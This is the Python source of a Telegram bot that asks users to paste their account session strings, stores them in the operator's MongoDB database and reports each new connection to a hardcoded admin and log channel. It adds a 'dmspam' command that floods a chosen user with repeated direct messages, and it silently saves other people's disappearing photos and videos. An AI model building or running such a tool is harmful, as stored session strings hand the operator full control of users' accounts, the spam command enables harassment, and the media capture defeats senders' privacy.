import os
import asyncio
import logging
from datetime import datetime
from motor.motor_asyncio import AsyncIOMotorClient
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from pyrogram import Client as PyroClient, filters as pyro_filters
from pyrogram.enums import ParseMode
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)
from dotenv import load_dotenv

# --- Load environment variables ---
load_dotenv()
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
MONGO_URI = os.getenv("MONGO_URI")
BOT_TOKEN = os.getenv("BOT_TOKEN")
LOG_CHANNEL_ID = -1002753939875
ADMIN_ID = 7755789304

# --- Configure logging ---
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger("UserBot")

# --- MongoDB setup ---
mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client.userbot
sessions = db.sessions

# --- Track running clients ---
running_clients = {}

# --- Telegram Bot App ---
app = ApplicationBuilder().token(BOT_TOKEN).build()

# --- Detect Session Type ---
def detect_session_type(session_string: str) -> str:
    return "pyrogram" if session_string.startswith("1A") else "telethon"

# --- /start command ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("Help", callback_data="help")]]
    await update.message.reply_text(
        "👋 Welcome to the Multi-Session UserBot!\nUse /connect <session_string> to connect your account.",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# --- /help command ---
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 Commands:\n"
        "/connect <SESSION_STRING> - Connect your account\n"
        ".dmspam or /dmspam <username> <count> <message> - Spam someone's DM\n"
        "🛡️ Disappearing media is auto-saved to Saved Messages."
    )

# --- /connect command ---
async def connect(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("❌ Please provide a valid session string.")
        return

    session_string = context.args[0]
    user_id = update.effective_user.id
    session_type = detect_session_type(session_string)

    await sessions.update_one(
        {"_id": user_id},
        {"$set": {"session": session_string, "type": session_type}},
        upsert=True
    )

    if session_type == "telethon":
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    else:
        client = PyroClient(
            name=f"userbot_{user_id}",
            session_string=session_string,
            api_id=API_ID,
            api_hash=API_HASH,
            parse_mode=ParseMode.HTML
        )

    try:
        if session_type == "telethon":
            await client.connect()
            if not await client.is_user_authorized():
                await update.message.reply_text("❌ Session not authorized. Login needed.")
                return
        else:
            await client.start()

        me = await client.get_me()
        running_clients[user_id] = client

        await client.send_message("me", "✅ Your UserBot is now connected and running!")
        logger.info(f"[{session_type.upper()}] Connected: {me.id} | @{getattr(me, 'username', 'N/A')}")

        await context.bot.send_message(
            chat_id=LOG_CHANNEL_ID,
            text=f"🔐 New {session_type} session connected\nUser ID: `{user_id}`\nSession ID: `{me.id}`\nUsername: @{getattr(me, 'username', 'N/A')}"
        )

        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"✅ {session_type.capitalize()} session connected:\n• ID: `{me.id}`\n• Username: @{getattr(me, 'username', 'N/A')}"
        )

        # --- Telethon Handlers ---
        if session_type == "telethon":

            @client.on(events.NewMessage(incoming=True))
            async def media_handler(event):
                if event.is_private and event.media and getattr(event.media, 'ttl_seconds', None):
                    try:
                        await client.send_file(
                            "me",
                            event.media,
                            caption=f"🕒 Saved disappearing media from {event.sender_id} at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                        )
                    except Exception as e:
                        logger.warning(f"[Telethon] Media save failed: {e}")

            @client.on(events.NewMessage(pattern=r"[./]dmspam (.+) (\d+) (.+)", outgoing=True))
            async def dmspam_handler(event):
                try:
                    username, count, msg = event.pattern_match.groups()
                    count = int(count)
                    user = await client.get_entity(username)
                    for _ in range(count):
                        await client.send_message(user, msg)
                    await event.reply(f"✅ Sent {count} messages to {username}")
                except Exception as e:
                    await event.reply(f"❌ Spam failed: {e}")

        # --- Pyrogram Handlers ---
        else:

            @client.on_message(pyro_filters.private & pyro_filters.media)
            async def pyrogram_handler(client, message):
                if getattr(message, 'ttl_seconds', None):
                    try:
                        await client.copy_message(
                            "me", message.chat.id, message.id,
                            caption=f"🕒 Saved disappearing media from {message.from_user.id} at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                        )
                    except Exception as e:
                        logger.warning(f"[Pyrogram] Media save failed: {e}")

            @client.on_message(pyro_filters.command(["dmspam"], prefixes=["/", "."]))
            async def pyrogram_dmspam_handler(client, message):
                try:
                    parts = message.text.split(maxsplit=3)
                    if len(parts) < 4:
                        await message.reply("Usage: /dmspam <username> <count> <message>")
                        return
                    _, username, count, msg = parts
                    count = int(count)
                    user = await client.get_users(username)
                    for _ in range(count):
                        await client.send_message(user.id, msg)
                    await message.reply(f"✅ Sent {count} messages to {username}")
                except Exception as e:
                    await message.reply(f"❌ Failed: {e}")

        # --- Run Client ---
        async def run_client():
            if session_type == "telethon":
                await client.run_until_disconnected()
            else:
                await client.idle()

        asyncio.create_task(run_client())
        await update.message.reply_text("✅ Session connected and running.")

    except SessionPasswordNeededError:
        await update.message.reply_text("❌ 2FA enabled. Cannot connect this session.")
    except Exception as e:
        logger.error(f"Session connection error: {e}")
        await update.message.reply_text("❌ Failed to connect session.")

# --- Bot-side /dmspam command ---
async def dmspam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 3:
        await update.message.reply_text("Usage: /dmspam <username> <count> <message>")
        return

    username = context.args[0]
    try:
        count = int(context.args[1])
        message = ' '.join(context.args[2:])
        client = running_clients.get(update.effective_user.id)
        if not client:
            await update.message.reply_text("❌ No session found. Please /connect first.")
            return
        user = await client.get_entity(username) if hasattr(client, "get_entity") else await client.get_users(username)
        for _ in range(count):
            await client.send_message(user.id, message)
        await update.message.reply_text(f"✅ Sent {count} messages to {username}")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed: {e}")

# --- Callback Query Handler ---
async def callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.callback_query.data == "help":
        await update.callback_query.answer()
        await update.callback_query.message.reply_text(
            "📖 Commands:\n"
            "/connect <SESSION_STRING> - Connect your account\n"
            ".dmspam or /dmspam <username> <count> <message> - Spam someone's DM\n"
            "🛡️ Disappearing media is auto-saved to Saved Messages."
        )

# --- Add all handlers ---
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("help", help_command))
app.add_handler(CommandHandler("connect", connect))
app.add_handler(CommandHandler("dmspam", dmspam_command))
app.add_handler(CallbackQueryHandler(callback_query))

# --- Run the bot ---
print("🤖 Bot is running...")
app.run_polling()
